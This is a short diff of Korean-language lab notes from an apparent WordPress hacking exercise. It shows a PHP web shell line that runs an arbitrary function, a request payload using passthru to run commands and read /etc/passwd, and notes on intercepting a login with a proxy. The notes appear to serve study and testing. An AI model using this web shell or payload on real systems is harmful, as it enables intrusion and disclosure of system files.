@@ -57,3 +57,14 @@ if (isset($s) && isset($y)) @die($x($y)); // 추출 결과가 x(함수) y(명령
 `http://vulnwp/wordpress/wp-content/plugins/`에 플러그인이 모두 저장되어 있다.
 ![[Pasted image 20240930141315.png]]
 `x=passthru&y=pwd;uname -a cat /etc/issu; cat /etc/passwd;` 이어서 명령어를 입력할 수 있다.
+![[Pasted image 20240930142417.png]]
+브라우저에서는 문자열로 인식하기 때문에 웹 쉘을 사용하게 된다.
+
+
+![[Pasted image 20240930142533.png]]
+![[Pasted image 20240930142544.png]]프록시에서 인터셉트 모드를 켠 상태
+
+![[Pasted image 20240930142648.png]]
+로그인 시도 > 브래이크 포인트에 갖힘
+![[Pasted image 20240930142744.png]]
+![[Pasted image 20240930142930.png]]![[Pasted image 20240930142944.png]]![[Pasted image 20240930143000.png]]
